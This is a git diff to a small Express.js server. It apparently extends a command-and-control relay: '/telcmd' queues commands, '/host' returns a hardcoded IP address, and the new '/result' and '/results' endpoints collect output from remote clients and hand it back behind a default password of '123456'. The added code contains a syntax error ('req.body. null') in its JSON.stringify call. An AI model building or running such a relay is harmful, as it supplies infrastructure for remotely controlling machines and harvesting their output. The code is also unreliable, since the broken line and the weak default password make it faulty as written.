@@ -3,6 +3,7 @@ var express = require('express');
 var path = require('path');
 var cookieParser = require('cookie-parser');
 var logger = require('morgan');
+const fs = require('fs');
 
 var app = express();
 
@@ -17,6 +18,12 @@ app.use(cookieParser());
 app.use(express.static(path.join(__dirname, 'public')));
 
 let cmd_buffer = [];
+let res_buffer = [];
+let password = '123456';
+
+if(fs.existsSync('password')) {
+    password = fs.readFileSync('password');
+}
 
 app.get('/telcmd', function(req, res, next) {
     let cmd = req.query.cmd;
@@ -63,6 +70,23 @@ app.get('/flush', function(req, res, next) {
 
 app.get('/host', function(req, res, next) {
     res.send('http://45.32.41.191:81');
+});
+
+app.post('/result', function(req, res, next) {
+    if(req.body) {
+        res_buffer.push(req.body);
+        fs.appendFileSync('results.json', JSON.stringify(req.body. null, 4));
+    }
+    res.end('');
+});
+
+app.get('/results', function(req, res, next) {
+    if(req.query.password == password) {
+        res.json(res_buffer);
+    }
+    else {
+        res.end('');
+    }
 });
 
 // catch 404 and forward to error handler
